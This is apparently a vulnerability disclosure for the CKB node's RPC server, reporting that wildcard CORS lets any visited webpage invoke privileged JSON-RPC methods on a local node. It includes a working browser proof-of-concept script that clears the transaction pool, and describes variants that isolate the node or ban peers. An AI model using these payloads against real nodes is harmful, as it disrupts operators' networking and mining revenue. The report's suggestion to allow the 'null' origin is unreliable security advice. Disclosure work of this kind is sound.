### Title
Unconditional `CorsLayer::permissive()` Allows Any Web Origin to Call All RPC Endpoints, Including Privileged Ones — (File: `rpc/src/server.rs`)

### Summary
The CKB RPC HTTP/WebSocket server unconditionally applies `CorsLayer::permissive()`, which responds to every preflight and cross-origin request with `Access-Control-Allow-Origin: *`. Because the server defaults to `127.0.0.1:8114`, any webpage a node operator visits in their browser can silently issue `fetch()` POST requests to the local RPC port and invoke every enabled RPC method — including state-mutating and network-disrupting endpoints — without any origin check or authentication. This is the direct CKB analog of the Tezoro Snap's missing origin validation on privileged endpoints.

### Finding Description

**Root cause — `rpc/src/server.rs` line 124:**

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← wildcard CORS, no origin restriction
    ...
```

`CorsLayer::permissive()` (from `tower-http`) sets:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
```

on every response, including preflight `OPTIONS` responses. This instructs the browser to allow any origin to read the response body of cross-origin requests.

**Why the localhost binding does not protect against this:**
The `listen_address = "127.0.0.1:8114"` default prevents remote network access. It does **not** prevent browser-based cross-origin requests. When a user visits `https://attacker.com`, the attacker's JavaScript can call:

```javascript
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    jsonrpc: "2.0", id: 1,
    method: "clear_tx_pool", params: []
  })
})
```

Because the server responds with `Access-Control-Allow-Origin: *`, the browser's Same-Origin Policy is satisfied and the response is readable. The request is fully executed server-side regardless.

**Privileged endpoints reachable this way (no authentication on any of them):**

| Module | Method | Impact |
|--------|--------|--------|
| Pool | `clear_tx_pool` | Wipes all pending transactions |
| Pool | `remove_transaction` | Removes a specific tx from pool |
| Net | `set_network_active` | Disables all P2P networking |
| Net | `set_ban` | Bans legitimate peers |
| Net | `add_node` / `remove_node` | Manipulates peer connections |
| Miner | `get_block_template` | Leaks pending tx set to attacker |
| Debug | `update_main_logger` | Modifies logging configuration |
| Debug | `jemalloc_profiling_dump` | Writes arbitrary files to disk |

None of these methods perform any caller-identity check. The `handle_jsonrpc` dispatcher at `rpc/src/server.rs:218` receives only the raw byte body — no `Origin` header, no token, no IP allowlist is inspected before dispatch:

```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,   // ← only the body; Origin header is never checked
) -> Response {
```

### Impact Explanation

**For a node operator / miner who visits any attacker-controlled page:**

1. **Tx-pool wipe** — `clear_tx_pool` empties the mempool instantly. For a mining node this means the next block template contains no fee-paying transactions, causing direct revenue loss.
2. **Network isolation** — `set_network_active(false)` disconnects the node from all peers. The node stops receiving new blocks and transactions; a miner wastes hashpower on a stale tip.
3. **Peer banning** — `set_ban` with a crafted CIDR can ban all known peers, achieving the same isolation without a visible config change.
4. **Information leakage** — `get_block_template` returns the full set of pending transactions including fee rates, giving the attacker a real-time view of the mempool.
5. **Disk write** — `jemalloc_profiling_dump` (Debug module) writes a heap profile to an operator-controlled path; if the Debug module is enabled, an attacker can trigger repeated writes.

### Likelihood Explanation

The attack requires only that the node operator opens a browser on the same machine as the node and visits a page containing the exploit. This is a realistic scenario for any developer, miner, or exchange operator running a local CKB node. No special privileges, leaked keys, or network access are required. The `CorsLayer::permissive()` call is unconditional and present in the production server code path used for both HTTP and WebSocket listeners.

### Recommendation

Replace `CorsLayer::permissive()` with an explicit allowlist. For a node that is only accessed by local tooling, the correct policy is to allow only `null` origin (direct file/localhost requests) or no cross-origin access at all:

```rust
use tower_http::cors::CorsLayer;
use axum::http::HeaderValue;

// Option A: deny all cross-origin requests
.layer(CorsLayer::new())

// Option B: allow only same-origin / null-origin (local tools)
.layer(
    CorsLayer::new()
        .allow_origin("null".parse::<HeaderValue>().unwrap())
)
```

Additionally, expose the allowed origins as a configurable field in `RpcConfig` so operators who intentionally expose the RPC to a known frontend can whitelist exactly that origin.

### Proof of Concept

A node operator running CKB with default config (`127.0.0.1:8114`, `Pool` module enabled) visits a page containing:

```html
<script>
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    jsonrpc: "2.0", id: 1,
    method: "clear_tx_pool",
    params: []
  })
}).then(r => r.json()).then(console.log);
</script>
```

The browser sends the request. The CKB server responds with `Access-Control-Allow-Origin: *`. The browser allows the response to be read. The tx pool is cleared. The attacker's page receives `{"jsonrpc":"2.0","result":null,"id":1}` confirming success.

The same script works for `set_network_active` with `params: [false]` to fully isolate the node, or `set_ban` with a crafted address range to ban all peers.

---

**Key code references:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-222)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
```

**File:** rpc/Cargo.toml (L54-54)
```text
tower-http = { workspace = true, features = ["timeout", "cors"] }
```

**File:** resource/ckb.toml (L177-193)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
